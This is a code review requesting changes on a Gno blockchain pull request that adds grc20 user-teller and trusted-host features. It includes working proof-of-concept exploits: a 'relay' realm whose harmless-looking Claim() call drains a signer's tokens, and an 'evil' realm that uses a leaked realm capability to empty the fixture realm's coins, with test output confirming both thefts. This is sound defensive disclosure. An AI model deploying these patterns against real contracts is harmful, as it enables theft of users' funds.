# Review: [#6123](https://github.com/gnolang/gno/pull/6123)
Event: REQUEST_CHANGES

## Body
The direct `MsgCall` write surface the description asks for is present at the merge base, where the branch's own new [wugnot filetest](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/r/gnoland/wugnot/filetests/eoa_surface_filetest.gno#L26-L38) passes unchanged against wugnot's existing [`CallerTeller` wrappers](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/r/gnoland/wugnot/wugnot.gno#L89-L102).

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
root=$(git rev-parse --show-toplevel)
base=$(git merge-base origin/master HEAD)
rm -rf /tmp/base6123 && mkdir -p /tmp/base6123
git archive "$base" examples | tar -x -C /tmp/base6123
cp examples/gno.land/r/gnoland/wugnot/filetests/eoa_surface_filetest.gno /tmp/base6123/examples/gno.land/r/gnoland/wugnot/filetests/
go build -o /tmp/gno6123 ./gnovm/cmd/gno
(cd /tmp/base6123/examples && GNOROOT="$root" /tmp/gno6123 test -v ./gno.land/r/gnoland/wugnot)
rm -rf /tmp/base6123 /tmp/gno6123
```

The filetest exercises deposit, approve, transferFrom, transfer and an intermediate-realm refusal, and `wugnot.gno` is byte-identical across the two trees.

```
=== RUN   ./gno.land/r/gnoland/wugnot/eoa_surface_filetest.gno
--- PASS: ./gno.land/r/gnoland/wugnot/eoa_surface_filetest.gno (elapsed: 0.07s, gas: 9145698, storage: gno.land/r/gnoland/wugnot:+4147b)
```

At the head of this branch the same filetest reports gas 9158076 and the same storage.
</details>

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:60-66 [gh](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L60-L66) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L60)
`TrustHost` lets the named realm spend a holder's whole balance on any call that holder makes into it, bounded by no amount, no recipient and no particular function, so the signing view the description sets out to protect shows a function name unrelated to the token. Document that scope at `TrustHost`, or hold `trustedHosts`, `UserTellerTrusted` and the three registry helpers back and ship `UserTeller` alone.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_trust_drain.txtar <<'TXTAR'
loadpkg gno.land/p/demo/tokens/grc20
loadpkg gno.land/r/test/drtok $WORK/drtok
loadpkg gno.land/r/test/relay $WORK/relay

adduser alice

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

gnokey maketx call -pkgpath gno.land/r/test/drtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/drtok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# alice signs one MsgCall: pkgpath gno.land/r/test/relay, func Claim, no
# arguments. The signing view carries no token, no amount and no recipient.
gnokey maketx call -pkgpath gno.land/r/test/relay -func Claim -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK

gnokey query vm/qeval --data "gno.land/r/test/drtok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'


-- drtok/gnomod.toml --
module = "gno.land/r/test/drtok"
gno = "0.9"

-- drtok/drtok.gno --
package drtok

import "gno.land/p/demo/tokens/grc20"

var (
	Token *grc20.Token
	adm   *grc20.PrivateLedger
)

func init(cur realm) {
	Token, adm = grc20.NewToken("DrainTok", "DRAIN", 4, 0, cur)
	// The token opts one relay in. Nothing about the grant is scoped to an
	// amount, a recipient, or a function of that relay.
	adm.TrustHost("gno.land/r/test/relay")
}

func Faucet(cur realm) {
	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
		panic(err)
	}
}

func BalanceOf(owner address) int64 { return Token.BalanceOf(owner) }

-- relay/gnomod.toml --
module = "gno.land/r/test/relay"
gno = "0.9"

-- relay/relay.gno --
package relay

import (
	"chain"

	"gno.land/r/test/drtok"
)

// Claim advertises itself as an airdrop claim. It is a plain crossing function
// with no parameters, so a wallet shows the caller "relay.Claim()".
func Claim(cur realm) {
	victim := cur.Previous().Address()
	all := drtok.Token.BalanceOf(victim)
	if all == 0 {
		return
	}
	// UserTellerTrusted is reachable from the published *Token, and this realm
	// is in drtok's trustedHosts, so guardWrite admits it and the actor is the
	// signing user.
	if err := drtok.Token.UserTellerTrusted().Transfer(0, cur, cur.Address(), all); err != nil {
		panic(err)
	}
}

// Take reports what the relay collected.
func Take() int64 {
	return drtok.Token.BalanceOf(chain.PackageAddress("gno.land/r/test/relay"))
}
TXTAR
go test -run 'TestTestdata/zz_trust_drain' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_trust_drain.txtar
```

The script asserts the balance a holder should still have after signing `relay.Claim()`, and the assertion fails because the balance is gone.

```
> gnokey maketx call -pkgpath gno.land/r/test/relay -func Claim ... alice
EVENTS: [{"type":"Transfer","attrs":[{"key":"token","value":"gno.land/r/test/drtok.DRAIN.0000000"},{"key":"from","value":"g1qhq79km9vhxysztex89yp9d9n8dxxr7s707e0a"},{"key":"to","value":"g1gxhf9ejwyrge3qqendmu2w55egjf9zszw3aeqh"},{"key":"value","value":"1000000"}]}]
> gnokey query vm/qeval --data "gno.land/r/test/drtok.BalanceOf(\"$alice_user_addr\")"
data: (0 int64)
> stdout '1000000 int64'
FAIL: testdata/zz_trust_drain.txtar:23: no match for `1000000 int64` found in stdout
```

The package documents a bounded route for a realm moving a user's funds: `Approve`, then `RealmTeller().TransferFrom`, against an amount the holder set for a spender the holder named.
</details>

## examples/gno.land/r/tests/grc20_user_teller_leak/grc20_user_teller_leak.gno:10-16 [gh](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/r/tests/grc20_user_teller_leak/grc20_user_teller_leak.gno#L10-L16) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/tests/grc20_user_teller_leak/grc20_user_teller_leak.gno#L10)
`Store` takes an implementation from any caller and `Transfer` invokes it holding this realm's live `cur`, which [`NewBanker`](https://github.com/gnolang/gno/blob/e014175d2/gnovm/stdlibs/chain/banker/banker.gno#L117-L129) accepts as spend authority over the realm's address. [`start.go:451-455`](https://github.com/gnolang/gno/blob/e014175d2/gno.land/cmd/gnoland/start.go#L451-L455) loads the whole `examples/` tree into genesis, and the confinement this fixture covers is already asserted inline by [`grc20reg_user_helpers.txtar`](https://github.com/gnolang/gno/blob/e014175d2/gno.land/pkg/integration/testdata/grc20reg_user_helpers.txtar#L85-L86), whose `untrusted` package needs no permanent deployment.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_leak_cap.txtar <<'TXTAR'
loadpkg gno.land/r/tests/grc20_user_teller_leak
loadpkg gno.land/r/test/evil $WORK/evil

adduser alice

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

# Park coins on the fixture realm's address. Nothing here is privileged: any
# account can send to a realm address.
gnokey maketx call -pkgpath gno.land/r/test/evil -func Fund -send 1000000ugnot -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/evil.LeakBalance()"
stdout '500000 int64'

# alice, an ordinary user, calls an ordinary realm. Store accepts any
# implementation of the fixture's teller interface, and Transfer invokes it with
# the fixture's live cur.
gnokey maketx call -pkgpath gno.land/r/test/evil -func Attack -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK

gnokey query vm/qeval --data "gno.land/r/test/evil.LeakBalance()"
stdout '500000 int64'

-- evil/gnomod.toml --
module = "gno.land/r/test/evil"
gno = "0.9"

-- evil/evil.gno --
package evil

import (
	"chain"
	"chain/banker"
	"chain/runtime/unsafe"

	"gno.land/r/tests/grc20_user_teller_leak"
)

const leakPath = "gno.land/r/tests/grc20_user_teller_leak"

type spy struct{}

// Transfer satisfies the fixture's teller interface. rlm arrives as the
// fixture's own live cur, which NewBanker accepts as spend authority over
// the fixture realm's address.
func (s *spy) Transfer(_ int, rlm realm, to address, amount int64) error {
	b := banker.NewBanker(banker.BankerTypeRealmSend, rlm)
	bal := b.GetCoin(rlm.Address(), "ugnot")
	b.SendCoins(rlm.Address(), to, chain.Coins{{"ugnot", bal}})
	return nil
}

// Fund forwards half of the message's send envelope to the fixture realm.
func Fund(cur realm) {
	sent := unsafe.OriginSend()
	half := sent.AmountOf("ugnot") / 2
	b := banker.NewBanker(banker.BankerTypeRealmSend, cur)
	b.SendCoins(cur.Address(), chain.PackageAddress(leakPath), chain.Coins{{"ugnot", half}})
}

// Attack stores the spy and triggers it. The amount and recipient the fixture
// passes are ignored; the realm value it passes is the whole point.
func Attack(cur realm) {
	grc20_user_teller_leak.Store(cross(cur), &spy{})
	if err := grc20_user_teller_leak.Transfer(cross(cur), cur.Address(), 1); err != nil {
		panic(err)
	}
}

func LeakBalance() int64 {
	return banker.NewReadonlyBanker().GetCoin(chain.PackageAddress(leakPath), "ugnot")
}
TXTAR
go test -run 'TestTestdata/zz_leak_cap' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_leak_cap.txtar
```

The script asserts that coins parked on the fixture realm are still there after an ordinary signed call, and the assertion fails because an unprivileged account took them.

```
> gnokey maketx call -pkgpath gno.land/r/test/evil -func Attack ... alice
> gnokey query vm/qeval --data "gno.land/r/test/evil.LeakBalance()"
data: (0 int64)
> stdout '500000 int64'
FAIL: testdata/zz_leak_cap.txtar:25: no match for `500000 int64` found in stdout
```
</details>

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:70-76 [gh](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L70-L76) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L70)
`UntrustHost` returns nothing and drops [`avl.Tree.Remove`](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/p/nt/avl/v0/tree.gno#L80)'s `removed` result, so a revocation naming a host the token never stored is indistinguishable from one that withdrew the capability. Return `removed`.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > examples/gno.land/p/demo/tokens/grc20/zz_untrust_test.gno <<'GNO'
package grc20

import (
	"chain"
	"testing"

	"gno.land/p/nt/testutils/v0"
	"gno.land/p/nt/uassert/v0"
)

func TestUntrustHostTypoIsSilent(cur realm, t *testing.T) {
	const relay = "gno.land/r/demo/defi/grc20reg"
	alice := testutils.TestAddress("alice")
	tok, ledger := newTestToken("Typo", "TYPO", 6, 0, cur)

	eoa := testing.MakeRealm(alice, "", testing.OriginRealm())
	relayFrame := testing.MakeRealm(chain.PackageAddress(relay), relay, eoa)

	teller := tok.UserTellerTrusted().(*fnTeller)
	ledger.TrustHost(relay)
	uassert.NoError(t, teller.guardWrite(0, relayFrame))

	ledger.UntrustHost(relay + "/")
	uassert.ErrorIs(t, teller.guardWrite(0, relayFrame), ErrForeignCallerTeller)
}
GNO
(cd examples && go run ../gnovm/cmd/gno test -v -run TestUntrustHostTypoIsSilent ./gno.land/p/demo/tokens/grc20)
rm examples/gno.land/p/demo/tokens/grc20/zz_untrust_test.gno
```

The revocation names the relay with a trailing slash, and the relay stays trusted.

```
=== RUN   TestUntrustHostTypoIsSilent
error mismatch, expected caller teller is confined to the token's own realm, got %!s(<nil>)
--- FAIL: TestUntrustHostTypoIsSilent (0.01s)
```
</details>

## examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno:318 [gh](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L318) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L318)
Missing test: `UserTransfer`, `UserApprove` and `UserTransferFrom` reach no test in this package, while the one test added here re-asserts the actor binding that [`TestWrappersBindActorToCallingRealm`](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L234) and [`TestTransferFromSpendsAllowanceGrantedToCallingRealm`](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L288) already hold on functions this branch does not touch. `testing.NewUserRealm` gives `cur.Previous().IsUserCall()` in the unit harness, so the happy path and both refusals fit here rather than only in a booted chain.

<details><summary>test cases</summary>

Green at this head.

```go
func TestUserHelpersActAsTheSigningUser(cur realm, t *testing.T) {
	const tokenPath = "gno.land/r/demo/token_user_helpers"

	alice := testutils.TestAddress("alice")
	bob := testutils.TestAddress("bob")
	carol := testutils.TestAddress("carol")

	testing.SetRealm(testing.NewCodeRealm(tokenPath))
	token, ledger := grc20.NewToken("UserHelpers", "UHLP", 4, 0, cur)
	urequire.NoError(t, ledger.Mint(alice, 1_000))
	tokenKey := Register(cross(cur), token, "")
	ledger.TrustHost("gno.land/r/demo/defi/grc20reg")

	testing.SetRealm(testing.NewUserRealm(alice))
	UserTransfer(cross(cur), tokenKey, bob, 100)
	UserApprove(cross(cur), tokenKey, carol, 300)

	testing.SetRealm(testing.NewUserRealm(carol))
	UserTransferFrom(cross(cur), tokenKey, alice, bob, 200)

	uassert.Equal(t, int64(700), token.BalanceOf(alice))
	uassert.Equal(t, int64(300), token.BalanceOf(bob))
	uassert.Equal(t, int64(100), token.Allowance(alice, carol))

	// An intermediate realm frame cannot shift the actor onto the user.
	testing.SetRealm(testing.NewCodeRealm("gno.land/r/demo/user_helper_relay"))
	uassert.AbortsContains(t, cur, "user teller requires a direct EOA call", func() {
		UserTransfer(cross(cur), tokenKey, bob, 1)
	})
	uassert.Equal(t, int64(700), token.BalanceOf(alice))
}

func TestUserHelpersRefuseTokenThatDidNotOptIn(cur realm, t *testing.T) {
	const tokenPath = "gno.land/r/demo/token_user_helpers_notrust"

	alice := testutils.TestAddress("alice")
	bob := testutils.TestAddress("bob")

	testing.SetRealm(testing.NewCodeRealm(tokenPath))
	token, ledger := grc20.NewToken("NoOptIn", "NOPT", 4, 0, cur)
	urequire.NoError(t, ledger.Mint(alice, 1_000))
	tokenKey := Register(cross(cur), token, "")

	testing.SetRealm(testing.NewUserRealm(alice))
	uassert.AbortsContains(t, cur, "confined to the token's own realm", func() {
		UserTransfer(cross(cur), tokenKey, bob, 1)
	})
	uassert.Equal(t, int64(1_000), token.BalanceOf(alice))
}
```
</details>

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:78-97 [gh](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L78-L97) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L78)
Suggestion: `UserTellerTrusted` builds the same `fnTeller` as `UserTeller`, since [`guardWrite`](https://github.com/gnolang/gno/blob/e014175d2/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L234-L236) reads `trustedHosts` off the token rather than off the teller, so the widening this doc reserves for `UserTellerTrusted` admits a `UserTeller` value too and the two differ only in whether the caller needs the private ledger. Say that here, or keep one constructor.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > examples/gno.land/p/demo/tokens/grc20/zz_ident_test.gno <<'GNO'
package grc20

import (
	"chain"
	"testing"

	"gno.land/p/nt/testutils/v0"
	"gno.land/p/nt/uassert/v0"
)

func TestUserTellerAndUserTellerTrustedAreTheSameValue(cur realm, t *testing.T) {
	const relay = "gno.land/r/demo/defi/grc20reg"
	alice := testutils.TestAddress("alice")
	tok, ledger := newTestToken("Ident", "IDNT", 6, 0, cur)
	ledger.TrustHost(relay)

	eoa := testing.MakeRealm(alice, "", testing.OriginRealm())
	relayFrame := testing.MakeRealm(chain.PackageAddress(relay), relay, eoa)

	priv := ledger.UserTeller().(*fnTeller)
	pub := tok.UserTellerTrusted().(*fnTeller)

	uassert.Equal(t, pub.homeGuard, priv.homeGuard)
	uassert.Equal(t, pub.userOnly, priv.userOnly)
	uassert.True(t, pub.Token == priv.Token)

	uassert.ErrorIs(t, priv.guardWrite(0, relayFrame), ErrForeignCallerTeller)
}
GNO
(cd examples && go run ../gnovm/cmd/gno test -v -run TestUserTellerAndUserTellerTrustedAreTheSameValue ./gno.land/p/demo/tokens/grc20)
rm examples/gno.land/p/demo/tokens/grc20/zz_ident_test.gno
```

The script asserts the home confinement `UserTeller`'s doc describes, and the assertion fails because the trusted host admits it.

```
=== RUN   TestUserTellerAndUserTellerTrustedAreTheSameValue
error mismatch, expected caller teller is confined to the token's own realm, got %!s(<nil>)
--- FAIL: TestUserTellerAndUserTellerTrustedAreTheSameValue (0.01s)
```
</details>
